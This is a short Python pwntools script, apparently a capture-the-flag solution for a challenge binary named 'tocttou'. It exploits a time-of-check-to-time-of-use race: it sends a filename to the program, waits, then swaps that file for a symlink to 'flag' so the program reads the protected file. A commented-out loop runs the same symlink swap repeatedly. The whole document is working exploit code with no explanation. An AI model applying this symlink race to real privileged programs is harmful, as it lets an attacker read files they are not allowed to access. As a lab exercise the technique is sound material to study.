#!/usr/bin/env python

from pwn import *
import os

p = process ("./tocttou")

p.sendline("file1")

sleep(1)

os.remove("file1")
os.symlink("flag", "file1")

p.interactive()



"""
while True:
    with open("a", "w"):
        pass
    os.unlink("a")
    os.symlink("flag", "a")
"""
